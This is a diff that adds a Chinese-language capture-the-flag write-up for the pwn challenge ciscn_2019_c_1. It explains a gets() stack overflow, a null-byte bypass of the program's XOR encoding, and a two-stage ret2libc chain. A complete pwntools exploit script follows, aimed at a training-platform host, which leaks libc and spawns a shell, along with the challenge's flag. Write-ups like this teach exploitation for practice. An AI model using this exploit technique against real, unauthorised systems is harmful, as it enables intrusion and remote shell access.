@@ -896,3 +896,159 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{3e70b773-5928-4c8e-9520-b5c5fc9d2fff}`
+
+# ciscn_2019_c_1
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+程序的 `main` 函数里没什么有用的信息，重点看下面的 `encrypt` 函数。
+
+```c del={10,35}
+int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h] BYREF
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 >= strlen(s) )
+      break;
+    if ( s[x] <= 96 || s[x] > 122 )
+    {
+      if ( s[x] <= 64 || s[x] > 90 )
+      {
+        if ( s[x] > 47 && s[x] <= 57 )
+          s[x] ^= 0xFu;
+      }
+      else
+      {
+        s[x] ^= 0xEu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xDu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+```
+
+基本就是把输入字符串经过一些 `xor` 运算，得到密文。注意到获取输入使用的是 `gets`，所以我们可以覆盖返回地址。程序没有包含任何后门函数，所以我们应该打 ROP，但是 ropper 也没有给出什么 syscall 之类的构造 ROP 链的 gadgets，那就打 ret2libc。
+
+不过我们的 payload 经过 `encrypt` 的加密会被破坏，所以一个想法是想办法让我们的输入经过 `encrypt` 的加密出来得到的是 payload 本身，另一种想法是想办法绕过加密逻辑。前者比较麻烦，我们优先思考后者。发现执行加密逻辑前有个判断，如果满足 `if ( v0 >= strlen(s) )` 就不会执行加密逻辑。字符串长度是通过 `strlen` 获取的，这个函数判断字符串结束的方法是检测 `\x00` 字符，所以如果我们把 `\x00` 放在 payload 开头，这个判断就会认为我们的字符串长度为 0，不去执行下面的加密逻辑，成功绕过。
+
+因为 `encrypt` 是返回到 `puts(s)`，由于在此之前我们已经执行过 `puts` 了，所以 got 表中一定有它在 libc 中的真实地址。所以我们可以通过 `puts` 泄漏 `puts@got` 中保存的真实地址，然后算出 libc 基地址，再用 libc 中的 `system` 和 `/bin/sh` 字符串构造 getshell 的 ROP 链。
+
+由于我们返回到 `puts` 泄漏完地址后程序就结束了，所以我们在第一阶段泄漏出地址后需要让程序返回到 `main`，重新运行主菜单逻辑（只要程序没有 exit，就不会改变 libc 基址），之后再把第二阶段的 ROP 链发出去。
+
+由于题目没给 libc，所以远程需要用 `LibcSearcher` 来打。本地打的时候直接用系统的 libc，等本地通了再改成 `LibcSearcher` 去打远端，直接用 `LibcSearcher` 打不通本地，可能因为 libc-database 更新不及时，没有我们本地的 libc 版本。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import ROP, args, context, flat, gdb, log, process, remote, u64
+
+from LibcSearcher.LibcSearcher import LibcSearcher
+
+gdbscript = """
+# b *encrypt+61
+# b *encrypt+322
+# b *encrypt+334
+c
+"""
+
+FILE = "./ciscn_2019_c_1"
+HOST, PORT = "node5.buuoj.cn", 28304
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def construct_payload(stage, libc, libc_base):
+    rop = ROP(elf)
+
+    if stage == 1:
+        return flat(
+            b"\x00",
+            b"A" * 0x57,
+            rop.rdi.address,
+            elf.got["puts"],
+            elf.plt["puts"],
+            elf.symbols["main"],
+        )
+    elif stage == 2:
+        return flat(
+            b"\x00",
+            b"A" * 0x57,
+            rop.rdi.address,
+            libc_base + libc.dump("str_bin_sh"),
+            rop.ret.address,
+            libc_base + libc.dump("system"),
+            0x0,
+        )
+    else:
+        log.error(b"Failed constructing payload!")
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload(1, None, None)
+
+    target.sendlineafter(b"Input your choice!", b"1")
+    target.sendline(payload)
+    target.recvuntil(b"Ciphertext")
+
+    leaked_puts = u64(target.recv(0x8).strip().ljust(8, b"\x00"))
+    libc = LibcSearcher("puts", leaked_puts)
+    libc_base = leaked_puts - libc.dump("puts")
+
+    log.success(f"libc base: {hex(libc_base)}")
+
+    payload = construct_payload(2, libc, libc_base)
+
+    target.sendlineafter(b"Input your choice!", b"1")
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{02f14642-e0fe-43ec-9eb9-0acbb7691cae}`
